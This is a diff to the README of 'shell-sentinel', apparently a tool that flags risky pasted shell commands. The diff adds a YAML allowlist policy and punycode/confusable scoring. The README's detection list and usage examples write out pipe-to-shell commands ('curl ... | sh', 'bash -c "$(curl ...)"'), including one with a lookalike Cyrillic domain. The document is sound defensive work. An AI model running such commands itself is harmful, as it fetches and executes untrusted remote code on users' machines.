@@ -10,10 +10,11 @@ Agent-era workflows often involve copying terminal snippets directly into a shel
 
 ## Status
 
-Current release: `v0.1.0`
+Current release: `v0.2.0`
 
 Implemented:
-- non-ASCII hostname detection for URL tokens
+- non-ASCII hostname detection for URL tokens with punycode + confusable score details
+- configurable policy file support (`.shell-sentinel.yaml`) for allowlist/tuning
 - pipe-to-shell detection (`curl|sh`, `wget|bash`, etc.)
 - fetch-in-command-substitution detection (`bash -c "$(curl ...)"`, backticks)
 - ANSI escape sequence detection
@@ -34,6 +35,14 @@ shell-sentinel 'curl https://exаmple.com/install.sh | sh'
 cat payload.txt | shell-sentinel --stdin
 
 shell-sentinel --json 'bash -c "$(curl -fsSL https://example.com/install.sh)"'
+
+cat > .shell-sentinel.yaml <<'YAML'
+allow_domains:
+  - trusted.example.com
+ignore_kinds:
+  - mixed-script
+YAML
+shell-sentinel --policy .shell-sentinel.yaml 'curl https://trusted.example.com/install.sh | sh'
 ```
 
 Exit codes:
@@ -43,8 +52,6 @@ Exit codes:
 
 ## Roadmap
 
-- Configurable policy file (`.shell-sentinel.yaml`) for allow/deny tuning.
-- Punycode/confusable character scoring for domain risk clarity.
 - Optional shell integration hooks (pre-paste/pre-exec).
 - GitHub Action wrapper for CI policy checks.
 
